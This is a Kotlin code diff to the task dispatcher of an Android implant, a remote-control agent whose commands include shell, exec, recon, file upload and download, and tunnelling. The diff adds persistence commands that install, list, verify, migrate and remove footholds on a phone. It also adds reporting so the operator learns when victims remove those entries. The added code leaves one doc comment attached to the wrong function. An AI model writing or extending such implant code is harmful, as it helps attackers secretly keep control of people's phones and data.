@@ -25,6 +25,8 @@ object TaskRunner {
         "shell", "exec", "sysinfo", "recon", "ls", "download", "cat", "upload",
         "tail", "hash", "ps", "sleep", "exit", "kill", "ping", "tunnel",
         "triage", "find", "netinfo", "env", "resolve", "touch",
+        "persist", "unpersist", "persist.list", "persist.verify",
+        "persist.migrate", "persist.health",
     )
 
     /**
@@ -41,6 +43,20 @@ object TaskRunner {
         val agentId: String,
         val version: String,
         val log: (String) -> Unit,
+        /**
+         * Where the implant keeps its own state.
+         *
+         * The persistence manager writes the entries it installed here, so
+         * the operator can ask the phone what is on it weeks later.
+         */
+        val stateDir: String = "",
+        /**
+         * The Android context, when the implant runs on a phone.
+         *
+         * It is optional on purpose: the task runner is plain JVM code, and
+         * the tests (and the desktop build of the tools) run without it.
+         */
+        val android: android.content.Context? = null,
     ) {
         override fun equals(other: Any?): Boolean = this === other
         override fun hashCode(): Int = System.identityHashCode(this)
@@ -254,6 +270,33 @@ object TaskRunner {
             )
             "netinfo" -> Outcome(0, netInfo().toByteArray(), "")
 
+            // ---- persistence ------------------------------------------------
+            "persist" -> persistence(
+                Persistence.install(
+                    context?.android,
+                    stateDir(),
+                    args,
+                ),
+            )
+
+            "unpersist" -> persistence(
+                Persistence.remove(
+                    context?.android,
+                    stateDir(),
+                    args,
+                ),
+            )
+
+            "persist.list" -> persistence(Persistence.list(stateDir()))
+            "persist.verify" -> persistence(Persistence.verify(context?.android, stateDir()))
+            "persist.migrate" -> persistence(
+                Persistence.migrate(context?.android, stateDir(), args),
+            )
+
+            "persist.health" -> persistence(
+                Persistence.health(context?.android, stateDir()),
+            )
+
             // ---- network reach and the local environment ------------------
             "env" -> environment(args.field("filter")?.text() ?: "")
             "resolve" -> resolve(
@@ -270,8 +313,6 @@ object TaskRunner {
             "token" -> unsupported("token", "token impersonation is a Windows capability")
             "privesc" -> unsupported("privesc", "privilege escalation is a Windows capability")
             "vpn" -> unsupported("vpn", "the layer-3 tunnel needs a tun device")
-            "persist" -> unsupported("persist", "the implant is installed by the service")
-            "unpersist" -> unsupported("unpersist", "the implant is installed by the service")
             "update" -> unsupported("update", "the implant is updated by the service")
             "session.open" -> unsupported("session.open", "an interactive session needs the desktop implant")
             "session.input" -> unsupported("session.input", "an interactive session needs the desktop implant")
@@ -313,6 +354,34 @@ object TaskRunner {
     }
 
     /** Report a capability this platform does not have. */
+    /**
+     * The result of a persistence task.
+     *
+     * The entries travel with the result, so the server keeps what is
+     * installed on every host and can tell the operator when an entry was
+     * removed behind their back.
+     */
+    private fun persistence(report: Persistence.Report): Outcome {
+        val entries = report.entries.map { entry ->
+            Upk.map(
+                "technique" to Upk.str(entry.technique),
+                "name" to Upk.str(entry.name),
+                "trigger" to Upk.str(entry.trigger),
+                "location" to Upk.str(entry.location),
+                "detail" to Upk.str(entry.detail),
+                "state" to Upk.str(entry.state),
+                "installed_at" to Upk.str(entry.installedAt),
+            )
+        }
+        return Outcome(0, report.text.toByteArray(), "")
+            .with("persist", Upk.Arr(entries))
+            .with("persist_total", Upk.num(report.total))
+            .with("persist_broken", Upk.num(report.broken))
+    }
+
+    /** Where the implant keeps its own state. */
+    private fun stateDir(): String = context?.stateDir ?: ""
+
     private fun unsupported(kind: String, why: String): Outcome =
         Outcome(2, ByteArray(0), "unsupported on this platform: $kind ($why)")
 
